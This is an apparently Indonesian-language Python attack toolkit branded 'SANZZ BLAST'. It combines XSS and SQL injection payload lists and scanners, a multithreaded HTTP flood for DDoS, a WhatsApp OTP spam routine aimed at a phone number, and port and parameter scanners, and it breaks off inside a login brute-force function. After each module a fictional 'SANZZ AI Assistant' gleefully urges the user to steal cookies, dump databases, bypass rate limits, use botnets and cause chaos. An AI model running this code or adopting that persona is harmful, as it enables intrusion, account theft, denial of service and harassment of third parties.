import requests
import sys
import urllib.parse
from bs4 import BeautifulSoup
import re
import time
import os
import platform
import threading
import random
import socket # Untuk port scanning
import smtplib # Untuk email spam
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

# --- Fungsi untuk membersihkan layar konsol ---
def clear_screen():
    os.system('cls' if platform.system() == 'Windows' else 'clear')

# --- Payload XSS Built-in (Sangat Komprehensif) ---
XSS_PAYLOADS = [
    "<script>alert(document.domain)</script>",
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<img src=x onerror=alert(document.cookie)>",
    "<body onload=alert(1)>",
    "<a href='javascript:alert(1)'>Click Me</a>",
    "<svg onload=alert(1)>",
    "\"><script>alert(1)</script>",
    "';alert(1)//",
    "\" onmouseover=\"alert(1)\"",
    "' onfocus='alert(1) autofocus='",
    "<sCrIpT>alert(1)</sCrIpT>",
    "<img%0A src=x%0A onerror=alert(1)>",
    "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
    "&#x3C;script&#x3E;alert(1)&#x3C;&#x2F;script&#x3E;",
    "<script>alert`1`</script>",
    "<img src=x onerror=alert>", # Tanpa kurung kurawal
    "<object data='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></object>" # Base64
]

# --- Payload SQL Injection Built-in ---
SQLI_PAYLOADS = [
    "' OR 1=1--",
    "' OR '1'='1--",
    "admin'--",
    "admin' #",
    "admin'/*",
    "' OR 1=1 #",
    "' OR 1=1/*",
    "' OR 'a'='a",
    "\" OR 1=1--",
    "\" OR \"a\"=\"a",
    "1' ORDER BY 1--", # Untuk deteksi kolom, bisa menyebabkan error jika kolom tidak ada
    "1' ORDER BY 99--", # Untuk deteksi kolom, akan menyebabkan error jika <99 kolom
    "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7178717871,(SELECT USER()),0x717a7a7171,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--", # Error-based MySQL
    "SLEEP(5)--", # Time-based Blind
    "1 AND SLEEP(5)",
    "benchmark(50000000,MD5(1))" # Time-based CPU
]

# --- User-Agent acak untuk DDoS dan permintaan web lainnya ---
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36"
]

# --- Fungsi untuk menampilkan banner Figlet ---
def print_banner():
    clear_screen()
    print("\033[1;31m" + "="*60) # Red top border
    print("|\033[0m" + " "*48 + "\033[1;31m|")
def print_banner():
    clear_screen()
    print("\033[1;31m|")  # Warna Merah
    print("""
 ____    _    _   _ __________  ____  _        _    ____ _____
/ ___|  / \  | \ | |__  /__  / | __ )| |      / \  / ___|_   _|
\___ \ / _ \ |  \| | / /  / /  |  _ \| |     / _ \ \___ \ | |
 ___) / ___ \| |\  |/ /_ / /_  | |_) | |___ / ___ \ ___) || |
|____/_/   \_\_| \_/____/____| |____/|_____/_/   \_\____/ |_|

    """)
    print("|\033[0m" + " "*14 + "\033[1;33mSANZZ BLAST\033[0m" + " "*13 + "\033[1;31m|") # Centered SANZZ BLAST
    print("|\033[0m" + " "*11 + "\033[1;32mDeveloper: SANZZ ATTACKER\033[0m" + " "*10 + "\033[1;31m|")
    print("|\033[0m" + " "*48 + "\033[1;31m|")
    print("="*50 + "\033[0m") # Red bottom border
    print("\n")

# --- Fungsi Pemindai XSS ---
def xss_scan(target_url, method="GET"):
    print(f"\033[1;34m[*] Memulai Pemindaian XSS pada: {target_url} (Metode: {method})\033[0m")
    found_vulnerabilities = []
    session = requests.Session()

    response_initial = None
    try:
        response_initial = session.get(target_url, timeout=15)
        soup_initial = BeautifulSoup(response_initial.text, 'html.parser')
        forms = soup_initial.find_all('form')
        for form in forms:
            if form.find(['textarea', 'input', 'select']):
                print(f"\033[1;33m[!] Potensi Stored XSS: Ditemukan form input/textarea di {target_url}\033[0m")
                print(f"\033[1;33m    Coba suntikkan payload ke form ini dan periksa apakah terefleksi setelah disimpan.\033[0m")
                found_vulnerabilities.append({"type": "Potential Stored XSS (Form Found)", "url": target_url})
                break
    except requests.exceptions.RequestException as e:
        print(f"\033[0;31m[-] Error saat memeriksa form untuk Stored XSS: {e}\033[0m")

    if 'response_initial' in locals() and response_initial:
        js_patterns = [
            r'document\.write\s*\(', r'innerHTML\s*=', r'location\.hash', r'location\.search',
            r'eval\s*\(', r'setTimeout\s*\('
        ]
        for pattern in js_patterns:
            if re.search(pattern, response_initial.text):
                print(f"\033[1;33m[!] Potensi DOM XSS: Ditemukan pola JavaScript rentan '{pattern}' di {target_url}\033[0m")
                print(f"\033[1;33m    Coba manipulasi parameter URL (hash/query) yang digunakan oleh JS ini.\033[0m")
                found_vulnerabilities.append({"type": f"Potential DOM XSS (JS Pattern: {pattern})", "url": target_url})
                break
    
    for payload in XSS_PAYLOADS:
        encoded_payload = urllib.parse.quote_plus(payload)

        if method.upper() == "GET":
            base_url = target_url.split('?')[0] if '?' in target_url else target_url
            query_params = urllib.parse.parse_qs(target_url.split('?', 1)[1]) if '?' in target_url else {}
            
            tested_urls = []
            if query_params:
                for param_name in query_params:
                    temp_params = query_params.copy()
                    temp_params[param_name] = encoded_payload
                    new_query_string = urllib.parse.urlencode(temp_params, doseq=True)
                    tested_urls.append(f"{base_url}?{new_query_string}")
            else:
                tested_urls.append(f"{base_url}?q={encoded_payload}")

            for test_url in tested_urls:
                try:
                    sys.stdout.write(f"\033[0;35m[*] Menguji GET: {test_url[:100]}...\r\033[0m")
                    sys.stdout.flush()
                    response = session.get(test_url, timeout=10)
                    
                    soup = BeautifulSoup(response.text, 'html.parser')
                    if payload in response.text or soup.find(lambda tag: tag.string and payload in str(tag.string)):
                        print(f"\n\033[1;31m[!!!] XSS Reflected Ditemukan !!!\033[0m")
                        print(f"\033[1;31m    URL Rentan: {test_url}\033[0m")
                        print(f"\033[1;31m    Payload: {payload}\033[0m")
                        found_vulnerabilities.append({"type": "Reflected XSS", "url": test_url, "payload": payload, "method": "GET"})
                        break 
                except requests.exceptions.RequestException as e:
                    sys.stdout.write(f"\n\033[0;31m[-] Error GET {test_url[:100]}...: {e}\033[0m\n")
                    break 

        elif method.upper() == "POST":
            post_data = {'q': payload} 
            try:
                sys.stdout.write(f"\033[0;35m[*] Menguji POST: {target_url} dengan data {str(post_data)[:50]}...\r\033[0m")
                sys.stdout.flush()
                response = session.post(target_url, data=post_data, timeout=10)

                soup = BeautifulSoup(response.text, 'html.parser')
                if payload in response.text or soup.find(lambda tag: tag.string and payload in str(tag.string)):
                    print(f"\n\033[1;31m[!!!] XSS Reflected Ditemukan (POST) !!!\033[0m")
                    print(f"\033[1;31m    URL Target: {target_url}\033[0m")
                    print(f"\033[1;31m    Payload: {payload}\033[0m")
                    found_vulnerabilities.append({"type": "Reflected XSS", "url": target_url, "payload": payload, "method": "POST", "data": post_data})
                
            except requests.exceptions.RequestException as e:
                sys.stdout.write(f"\n\033[0;31m[-] Error POST {target_url}: {e}\033[0m\n")
        
        else:
            print(f"\n\033[0;31m[-] Metode HTTP '{method}' tidak didukung. Gunakan 'GET' atau 'POST'.\033[0m")
            break

    sys.stdout.write("\n")
    print("\n\033[1;36m" + "="*60 + "\033[0m")
    if found_vulnerabilities:
        print("\033[1;33m[!] Hasil Pemindaian XSS Selesai! Kerentanan Ditemukan:\033[0m")
        for vuln in found_vulnerabilities:
            print(f"\033[1;31m  - Tipe: {vuln['type']}, URL: {vuln['url']}")
            if 'payload' in vuln:
                print(f"\033[1;31m    Payload: {vuln['payload']}\033[0m")
        
        print("\n\033[1;35m--- SANZZ AI Assistant Says: ---\033[0m")
        print("\033[0;35mAha! XSS ditemukan! Ini adalah celah manis untuk manipulasi klien.")
        print("  - \033[1;37mCuri Cookie:\033[0m Gunakan `document.cookie` untuk mencuri sesi pengguna dan membajak akun mereka!")
        print("  - \033[1;37mDeface Halaman:\033[0m Ubah `document.body.innerHTML` untuk mengubah tampilan situs web sesuai keinginanmu.")
        print("  - \033[1;37mPhishing:\033[0m Suntikkan form login palsu untuk mencuri kredensial pengguna lain.")
        print("  - \033[1;37mRedirect:\033[0m Arahkan korban ke situs berbahaya atau situs jebakanmu.")
        print("\033[0;35mManfaatkan celah ini untuk keuntungan maksimalmu! Haha! 😈\033[0m")
    else:
        print("\033[1;32m[+] Pemindaian XSS Selesai! Tidak ada kerentanan XSS yang ditemukan dengan payload dan metode ini.\033[0m")
    print("\033[1;36m" + "="*60 + "\033[0m")


# --- Fungsi Pemindai SQL Injection ---
def sqli_scan(target_url, method="GET"):
    print(f"\033[1;34m[*] Memulai Pemindaian SQL Injection pada: {target_url} (Metode: {method})\033[0m")
    found_vulnerabilities = []
    session = requests.Session()

    SQL_ERROR_PATTERNS = [
        r"You have an error in your SQL syntax", r"Warning: mysql_fetch_array()",
        r"supplied argument is not a valid MySQL result", r"Microsoft OLE DB Provider for ODBC Drivers error",
        r"ODBC Error", r"Fatal error: Call to undefined function", r"SQLSTATE\[",
        r"ORA-\d{5}", r"PostgreSQL error", r"syntax error at or near",
        r"unexpected end of file", r"\[SQLSTATE", r"Unclosed quotation mark"
    ]

    baseline_response_time = 0
    baseline_response_text = ""
    baseline_response_len = 0
    
    try:
        start_time = time.time()
        baseline_response = session.get(target_url, timeout=15)
        baseline_response_time = time.time() - start_time
        baseline_response_text = baseline_response.text
        baseline_response_len = len(baseline_response.text)
        print(f"\033[0;32m[+] Baseline response time: {baseline_response_time:.2f} seconds\033[0m")
        print(f"\033[0;32m[+] Baseline response length: {baseline_response_len} characters\033[0m")
    except requests.exceptions.RequestException as e:
        print(f"\033[0;31m[-] Error saat mengambil baseline response: {e}\033[0m")
        print(f"\033[0;31m[-] Tidak dapat melanjutkan pemindaian SQLi tanpa baseline yang valid.\033[0m")
        return

    # --- Boolean-Based Blind SQLi Check (khusus GET untuk parameter yang jelas) ---
    if method.upper() == "GET" and '?' in target_url:
        base_url = target_url.split('?')[0]
        query_params = urllib.parse.parse_qs(target_url.split('?', 1)[1])
        
        param_to_inject = None
        if query_params:
            param_to_inject = list(query_params.keys())[0] # Ambil parameter pertama yang ditemukan
        
        if param_to_inject:
            print(f"\033[0;34m[*] Memulai pengujian Boolean-Based Blind SQLi pada parameter '{param_to_inject}'.\033[0m")
            
            # Test dengan kondisi TRUE (1=1)
            original_param_value = query_params[param_to_inject][0]
            if original_param_value.isdigit():
                true_payload_val = f"{original_param_value} AND 1=1--"
                false_payload_val = f"{original_param_value} AND 1=0--"
            else: # Jika nilai asli adalah string, tambahkan kutip
                true_payload_val = f"'{original_param_value}' AND 1=1--"
                false_payload_val = f"'{original_param_value}' AND 1=0--"

            encoded_true_payload = urllib.parse.quote_plus(true_payload_val)
            temp_params_true = query_params.copy()
            temp_params_true[param_to_inject] = [encoded_true_payload] # Pastikan ini list
            true_test_url = f"{base_url}?{urllib.parse.urlencode(temp_params_true, doseq=True)}"
            
            response_true_len = -1
            try:
                sys.stdout.write(f"\033[0;35m[*] Mengambil respons TRUE baseline ({param_to_inject})...\r\033[0m")
                sys.stdout.flush()
                response_true = session.get(true_test_url, timeout=10)
                response_true_len = len(response_true.text)
                sys.stdout.write(f"\033[0;32m[+] TRUE baseline length: {response_true_len}\033[0m\n")
            except requests.exceptions.RequestException as e:
                sys.stdout.write(f"\n\033[0;31m[-] Error TRUE baseline: {e}\033[0m\n")

            # Test dengan kondisi FALSE (1=0)
            encoded_false_payload = urllib.parse.quote_plus(false_payload_val)
            temp_params_false = query_params.copy()
            temp_params_false[param_to_inject] = [encoded_false_payload] # Pastikan ini list
            false_test_url = f"{base_url}?{urllib.parse.urlencode(temp_params_false, doseq=True)}"
            
            response_false_len = -1
            try:
                sys.stdout.write(f"\033[0;35m[*] Mengambil respons FALSE baseline ({param_to_inject})...\r\033[0m")
                sys.stdout.flush()
                response_false = session.get(false_test_url, timeout=10)
                response_false_len = len(response_false.text)
                sys.stdout.write(f"\033[0;32m[+] FALSE baseline length: {response_false_len}\033[0m\n")
            except requests.exceptions.RequestException as e:
                sys.stdout.write(f"\n\033[0;31m[-] Error FALSE baseline: {e}\033[0m\n")

            # Bandingkan panjangnya
            if response_true_len != -1 and response_false_len != -1 and response_true_len != response_false_len:
                print(f"\n\033[1;31m[!!!] SQL Injection (Boolean-Based Blind) Ditemukan !!!\033[0m")
                print(f"\033[1;31m    URL Rentan (Parameter: {param_to_inject}): {target_url}\033[0m")
                print(f"\033[1;31m    Payload TRUE: {true_payload_val}\033[0m")
                print(f"\033[1;31m    Payload FALSE: {false_payload_val}\033[0m")
                print(f"\033[1;31m    Perbedaan Panjang Respons (TRUE vs FALSE): {response_true_len} vs {response_false_len}\033[0m")
                found_vulnerabilities.append({"type": "Boolean-Based Blind SQLi", "url": target_url, "param": param_to_inject, "method": "GET"})
            else:
                print(f"\033[0;32m[+] Tidak ada indikasi Boolean-Based Blind SQLi pada parameter '{param_to_inject}'.\033[0m")
        else:
            print(f"\033[0;33m[!] Tidak ada parameter URL yang ditemukan untuk pengujian Boolean-Based Blind SQLi.\033[0m")
    elif method.upper() == "POST":
        print(f"\033[0;33m[!] Pengujian Boolean-Based Blind SQLi untuk POST membutuhkan pengetahuan parameter form yang spesifik.\033[0m")


    # --- Error-Based & Time-Based SQLi Checks ---
    for payload in SQLI_PAYLOADS:
        encoded_payload = urllib.parse.quote_plus(payload)

        if method.upper() == "GET":
            base_url = target_url.split('?')[0] if '?' in target_url else target_url
            query_params = urllib.parse.parse_qs(target_url.split('?', 1)[1]) if '?' in target_url else {}

            tested_urls = []
            if query_params:
                for param_name in query_params:
                    temp_params = query_params.copy()
                    temp_params[param_name] = encoded_payload
                    new_query_string = urllib.parse.urlencode(temp_params, doseq=True)
                    tested_urls.append(f"{base_url}?{new_query_string}")
            else:
                tested_urls.append(f"{base_url}?id={encoded_payload}")

            for test_url in tested_urls:
                try:
                    sys.stdout.write(f"\033[0;35m[*] Menguji GET: {test_url[:100]}...\r\033[0m")
                    sys.stdout.flush()
                    
                    start_time = time.time()
                    response = session.get(test_url, timeout=15)
                    response_time = time.time() - start_time

                    # Deteksi Error-Based SQLi
                    for pattern in SQL_ERROR_PATTERNS:
                        if re.search(pattern, response.text, re.IGNORECASE):
                            print(f"\n\033[1;31m[!!!] SQL Injection (Error-Based) Ditemukan !!!\033[0m")
                            print(f"\033[1;31m    URL Rentan: {test_url}\033[0m")
                            print(f"\033[1;31m    Payload: {payload}\033[0m")
                            print(f"\033[1;31m    Pesan Error: {re.search(pattern, response.text, re.IGNORECASE).group(0)[:100]}...\033[0m")
                            found_vulnerabilities.append({"type": "Error-Based SQLi", "url": test_url, "payload": payload, "method": "GET"})
                            break
                    
                    # Deteksi Time-Based Blind SQLi
                    if "SLEEP" in payload.upper() or "BENCHMARK" in payload.upper():
                        if response_time >= baseline_response_time * 2 and response_time > 3: # Cek jika waktu respons jauh lebih lama
                            print(f"\n\033[1;31m[!!!] SQL Injection (Time-Based Blind) Ditemukan !!!\033[0m")
                            print(f"\033[1;31m    URL Rentan: {test_url}\033[0m")
                            print(f"\033[1;31m    Payload: {payload}\033[0m")
                            print(f"\033[1;31m    Waktu Respons: {response_time:.2f} detik (Baseline: {baseline_response_time:.2f} detik)\033[0m")
                            found_vulnerabilities.append({"type": "Time-Based Blind SQLi", "url": test_url, "payload": payload, "method": "GET"})
                            
                except requests.exceptions.RequestException as e:
                    sys.stdout.write(f"\n\033[0;31m[-] Error GET {test_url[:100]}...: {e}\033[0m\n")
                    break

        elif method.upper() == "POST":
            # Asumsi parameter POST adalah 'id'. Sesuaikan jika perlu.
            post_data = {'id': payload} 
            try:
                sys.stdout.write(f"\033[0;35m[*] Menguji POST: {target_url} dengan data {str(post_data)[:50]}...\r\033[0m")
                sys.stdout.flush()
                
                start_time = time.time()
                response = session.post(target_url, data=post_data, timeout=15)
                response_time = time.time() - start_time

                # Deteksi Error-Based SQLi (POST)
                for pattern in SQL_ERROR_PATTERNS:
                    if re.search(pattern, response.text, re.IGNORECASE):
                        print(f"\n\033[1;31m[!!!] SQL Injection (Error-Based) Ditemukan (POST) !!!\033[0m")
                        print(f"\033[1;31m    URL Target: {target_url}\033[0m")
                        print(f"\033[1;31m    Payload: {payload}\033[0m")
                        print(f"\033[1;31m    Pesan Error: {re.search(pattern, response.text, re.IGNORECASE).group(0)[:100]}...\033[0m")
                        found_vulnerabilities.append({"type": "Error-Based SQLi", "url": target_url, "payload": payload, "method": "POST", "data": post_data})
                        break
                
                # Deteksi Time-Based Blind SQLi (POST)
                if "SLEEP" in payload.upper() or "BENCHMARK" in payload.upper():
                    if response_time >= baseline_response_time * 2 and response_time > 3:
                        print(f"\n\033[1;31m[!!!] SQL Injection (Time-Based Blind) Ditemukan (POST) !!!\033[0m")
                        print(f"\033[1;31m    URL Target: {target_url}\033[0m")
                        print(f"\033[1;31m    Payload: {payload}\033[0m")
                        print(f"\033[1;31m    Waktu Respons: {response_time:.2f} detik (Baseline: {baseline_response_time:.2f} detik)\033[0m")
                        found_vulnerabilities.append({"type": "Time-Based Blind SQLi", "url": target_url, "payload": payload, "method": "POST", "data": post_data})

            except requests.exceptions.RequestException as e:
                sys.stdout.write(f"\n\033[0;31m[-] Error POST {target_url}: {e}\033[0m\n")
        
        else:
            print(f"\n\033[0;31m[-] Metode HTTP '{method}' tidak didukung. Gunakan 'GET' atau 'POST'.\033[0m")
            break

    sys.stdout.write("\n")
    print("\n\033[1;36m" + "="*60 + "\033[0m")
    if found_vulnerabilities:
        print("\033[1;33m[!] Hasil Pemindaian SQL Injection Selesai! Kerentanan Ditemukan:\033[0m")
        for vuln in found_vulnerabilities:
            print(f"\033[1;31m  - Tipe: {vuln['type']}, URL: {vuln['url']}")
            if 'payload' in vuln:
                print(f"\033[1;31m    Payload: {vuln['payload']}\033[0m")
        
        print("\n\033[1;35m--- SANZZ AI Assistant Says: ---\033[0m")
        print("\033[0;35mSQL Injection terdeteksi! Database itu ada di genggamanmu!")
        print("  - \033[1;37mDump Database:\033[0m Ekstrak semua tabel dan data, termasuk kredensial admin dan informasi sensitif!")
        print("  - \033[1;37mBypass Autentikasi:\033[0m Masuk sebagai admin atau pengguna mana pun tanpa sandi!")
        print("  - \033[1;37mRemote Code Execution (RCE):\033[0m Jika beruntung, dapatkan akses shell ke server database!")
        print("  - \033[1;37mModifikasi Data:\033[0m Ubah, hapus, atau tambahkan data sesuai keinginanmu, ciptakan kekacauan!")
        print("\033[0;35mDatabase adalah mahkotamu. Ambil semua yang kau inginkan! Haha! 😈\033[0m")
    else:
        print("\033[1;32m[+] Pemindaian SQL Injection Selesai! Tidak ada kerentanan SQL Injection yang ditemukan dengan payload dan metode ini.\033[0m")
    print("\033[1;36m" + "="*60 + "\033[0m")

# --- Variabel kontrol untuk menghentikan DDoS ---
stop_ddos = threading.Event()

# --- Fungsi untuk serangan DDoS (HTTP Flood) ---
def ddos_worker(target_url):
    while not stop_ddos.is_set():
        try:
            headers = {'User-Agent': random.choice(USER_AGENTS)}
            random_path = '/' + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=random.randint(5, 15)))
            full_url = target_url + random_path
            
            requests.get(full_url, headers=headers, timeout=5)
        except requests.exceptions.RequestException:
            pass

def ddos_attack(target_url, num_threads):
    print(f"\033[1;34m[*] Memulai Serangan DDoS pada: {target_url} dengan {num_threads} thread!\033[0m")
    print(f"\033[1;33m[!] Tekan Ctrl+C untuk menghentikan serangan.\033[0m")
    
    threads = []
    stop_ddos.clear()

    for _ in range(num_threads):
        thread = threading.Thread(target=ddos_worker, args=(target_url,))
        thread.daemon = True
        thread.start()
        threads.append(thread)
    
    try:
        while True:
            time.sleep(1)
            sys.stdout.write(f"\033[0;35m[*] Serangan DDoS aktif... ({len(threads)} thread)\r\033[0m")
            sys.stdout.flush()
    except KeyboardInterrupt:
        print("\n\033[1;31m[!] Menghentikan serangan DDoS...\033[0m")
        stop_ddos.set()
        for thread in threads:
            thread.join(timeout=1)
        print("\033[1;32m[+] Serangan DDoS dihentikan.\033[0m")
    
    print("\n\033[1;35m--- SANZZ AI Assistant Says: ---\033[0m")
    print("\033[0;35mGelombang seranganmu telah menghantam! DDoS adalah seni membanjiri target!")
    print("  - \033[1;37mTingkatkan Kekuatan:\033[0m Gunakan lebih banyak thread atau dari berbagai sumber (botnet) untuk efek maksimal!")
    print("  - \033[1;37mSerangan Layer 4:\033[0m Untuk lebih mematikan, kombinasikan dengan SYN/UDP Flood menggunakan alat lain (hping3)!")
    print("  - \033[1;37mTargetkan API:\033[0m Fokuskan serangan pada endpoint API yang menguras sumber daya server, bukan hanya halaman statis.")
    print("\033[0;35mBiarkan targetmu tenggelam dalam lautan permintaan! Haha! 😈\033[0m")
    print("\033[1;36m" + "="*60 + "\033[0m")


# --- Fungsi untuk Spam OTP WhatsApp ---
def whatsapp_otp_spam(target_phone_number, otp_request_endpoint, num_requests):
    print(f"\033[1;34m[*] Memulai Spam OTP WhatsApp ke: {target_phone_number} ({num_requests}x)\033[0m")
    print(f"\033[1;33m[!] Ini akan mencoba mengirim permintaan OTP ke endpoint yang diberikan.\033[0m")
    print(f"\033[1;33m[!] Pastikan '{otp_request_endpoint}' adalah endpoint yang benar untuk meminta OTP.\033[0m")
    
    session = requests.Session()
    sent_count = 0

    for i in range(num_requests):
        try:
            data = {'phone_number': target_phone_number} 
            headers = {'User-Agent': random.choice(USER_AGENTS)}

            sys.stdout.write(f"\033[0;35m[*] Mengirim permintaan OTP ke {otp_request_endpoint} ({i+1}/{num_requests})...\r\033[0m")
            sys.stdout.flush()
            
            response = session.post(otp_request_endpoint, json=data, headers=headers, timeout=10)
            
            if response.status_code == 200:
                print(f"\n\033[0;32m[+] Permintaan OTP berhasil dikirim! ({response.status_code})\033[0m")
                sent_count += 1
            else:
                print(f"\n\033[0;31m[-] Permintaan OTP gagal (Status: {response.status_code}). Respons: {response.text[:100]}...\033[0m")
            
            time.sleep(random.uniform(1, 3))
            
        except requests.exceptions.RequestException as e:
            print(f"\n\033[0;31m[-] Error saat mengirim permintaan OTP: {e}\033[0m")
            time.sleep(random.uniform(2, 5))
        except KeyboardInterrupt:
            print("\n\033[1;31m[!] Proses spam OTP dihentikan oleh pengguna.\033[0m")
            break
    
    sys.stdout.write("\n")
    print("\033[1;36m" + "="*60 + "\033[0m")
    print(f"\033[1;33m[!] Spam OTP Selesai! Total permintaan berhasil: {sent_count}/{num_requests}\033[0m")
    
    print("\n\033[1;35m--- SANZZ AI Assistant Says: ---\033[0m")
    print("\033[0;35mHaha! Banjiri target dengan OTP! Sebuah gangguan yang menyenangkan!")
    print("  - \033[1;37mCari Endpoint Asli:\033[0m Temukan endpoint API yang sebenarnya digunakan aplikasi untuk meminta OTP (gunakan Burp Suite/proxy saat target meminta OTP).")
    print("  - \033[1;37mAnalisis Parameter:\033[0m Pahami parameter apa saja yang dibutuhkan (nomor telepon, country code, device ID, dll.) dan formatnya (JSON, form-data).")
    print("  - \033[1;37mBypass Rate Limit:\033[0m Gunakan proxy, rotasi IP, atau ubah User-Agent untuk melewati batasan frekuensi permintaan.")
    print("  - \033[1;37mSerangan Terus-menerus:\033[0m Jalankan dalam loop tak terbatas untuk gangguan maksimal!")
    print("\033[0;35mBuat mereka kewalahan dengan notifikasi! Nikmati kekacauan ini! Haha! 😈\033[0m")
    print("\033[1;36m" + "="*60 + "\033[0m")


# --- Fungsi untuk Parameter Scan ---
def parameter_scan(target_url):
    print(f"\033[1;34m[*] Memulai Parameter Scan pada: {target_url}\033[0m")
    found_params = set()
    session = requests.Session()

    try:
        response = session.get(target_url, timeout=15, headers={'User-Agent': random.choice(USER_AGENTS)})
        soup = BeautifulSoup(response.text, 'html.parser')

        # 1. Dari URL yang ada
        parsed_url = urllib.parse.urlparse(target_url)
        query_params = urllib.parse.parse_qs(parsed_url.query)
        for param in query_params:
            found_params.add(param)

        # 2. Dari link (<a> tags)
        for a_tag in soup.find_all('a', href=True):
            href = a_tag['href']
            full_href = urllib.parse.urljoin(target_url, href)
            parsed_href = urllib.parse.urlparse(full_href)
            href_query_params = urllib.parse.parse_qs(parsed_href.query)
            for param in href_query_params:
                found_params.add(param)

        # 3. Dari form fields (<input>, <textarea>, <select>)
        for form_tag in soup.find_all('form'):
            for input_tag in form_tag.find_all(['input', 'textarea', 'select']):
                if 'name' in input_tag.attrs:
                    found_params.add(input_tag['name'])
        
        # 4. Dari JavaScript (pola sederhana)
        for script_tag in soup.find_all('script'):
            if script_tag.string:
                for pattern in [r'\.get\(\s*[\'"]\?([^&\'"]+)=', r'[\'"]\?([^&\'"]+)=', r'name\s*=\s*[\'"]([^&\'"]+)']:
                    matches = re.findall(pattern, script_tag.string)
                    for match in matches:
                        if isinstance(match, tuple):
                            for m in match:
                                if m: found_params.add(m)
                        else:
                            if match: found_params.add(match)

    except requests.exceptions.RequestException as e:
        print(f"\033[0;31m[-] Error saat mengambil {target_url}: {e}\033[0m")
    
    print("\n\033[1;36m" + "="*60 + "\033[0m")
    if found_params:
        print("\033[1;33m[!] Parameter Ditemukan:\033[0m")
        for param in sorted(list(found_params)):
            print(f"\033[1;32m  - {param}\033[0m")
        
        print("\n\033[1;35m--- SANZZ AI Assistant Says: ---\033[0m")
        print("\033[0;35mAha! Parameter-parameter ini adalah pintu masuk ke sistem!")
        print("  - \033[1;37mUji SQLi/XSS:\033[0m Suntikkan payload ke setiap parameter untuk mencari celah.")
        print("  - \033[1;37mManipulasi Data:\033[0m Ubah nilai parameter untuk melihat reaksi aplikasi (misal: `id=1` menjadi `id=2`).")
        print("  - \033[1;37mOpen Redirect:\033[0m Cari parameter seperti `url`, `redirect`, `next` untuk mengarahkan korban ke situsmu.")
        print("\033[0;35mSetiap parameter adalah potensi kelemahan. Manfaatkan semuanya! Haha! 😈\033[0m")
    else:
        print("\033[1;32m[+] Tidak ada parameter yang ditemukan secara otomatis.\033[0m")
    print("\033[1;36m" + "="*60 + "\033[0m")


# --- Fungsi untuk Port Scan ---
def port_scan(target_host, start_port, end_port):
    print(f"\033[1;34m[*] Memulai Port Scan pada: {target_host} dari port {start_port} hingga {end_port}\033[0m")
    open_ports = []

    try:
        target_ip = socket.gethostbyname(target_host)
        print(f"\033[0;32m[+] Target IP: {target_ip}\033[0m")
    except socket.gaierror:
        print(f"\033[0;31m[-] Gagal menyelesaikan hostname: {target_host}\033[0m")
        return

    for port in range(start_port, end_port + 1):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5) # Timeout koneksi 0.5 detik
            result = sock.connect_ex((target_ip, port))
            if result == 0:
                print(f"\033[1;32m[+] Port {port} Terbuka!\033[0m")
                open_ports.append(port)
            else:
                sys.stdout.write(f"\033[0;35m[*] Memindai port {port}...\r\033[0m")
                sys.stdout.flush()
            sock.close()
        except socket.error as e:
            print(f"\n\033[0;31m[-] Error saat memindai port {port}: {e}\033[0m")
            break
        except KeyboardInterrupt:
            print(f"\n\033[1;31m[!] Pemindaian port dihentikan oleh pengguna.\033[0m")
            break

    sys.stdout.write("\n")
    print("\n\033[1;36m" + "="*60 + "\033[0m")
    if open_ports:
        print("\033[1;33m[!] Port Terbuka Ditemukan:\033[0m")
        for port in open_ports:
            print(f"\033[1;32m  - {port}\033[0m")
        
        print("\n\033[1;35m--- SANZZ AI Assistant Says: ---\033[0m")
        print("\033[0;35mAha! Port-port ini adalah gerbang ke layanan di server!")
        print("  - \033[1;37mIdentifikasi Layanan:\033[0m Gunakan Nmap (`nmap -sV -p<port> <target_ip>`) untuk mengetahui layanan apa yang berjalan di port-port ini.")
        print("  - \033[1;37mCari Eksploit:\033[0m Setelah tahu layanannya, cari kerentanan dan eksploit yang sesuai (misal: Metasploit, Exploit-DB).")
        print("  - \033[1;37mAkses Tersembunyi:\033[0m Port yang tidak standar (misal: 2222, 8080) mungkin menyembunyikan panel admin atau layanan lain.")
        print("\033[0;35mSetiap port terbuka adalah undangan. Masuk dan lihat apa yang bisa kau temukan! Haha! 😈\033[0m")
    else:
        print("\033[1;32m[+] Tidak ada port terbuka yang ditemukan dalam rentang yang diberikan.\033[0m")
    print("\033[1;36m" + "="*60 + "\033[0m")

# --- Fungsi untuk Brute Force Attack ---
def brute_force_attack(target_url, username_list_path, password_list_path, username_field, password_field, fail_message):
    print(f"\033[1;34m[*] Memulai Brute Force Attack pada: {target_url}\033[0m")
    print(f"\033[1;34m[*] Menggunakan field: Username='{username_field}', Password='{password_field}'\033[0m")
    print(f"\033[1;33m[!] Pesan kegagalan yang dicari: '{fail_message}'\033[0m")

    try:
        with open(username_list_path, 'r') as f:
            usernames = [line.strip() for line in f if line.strip()]
        with open(password_list_path, 'r') as f:
            passwords = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
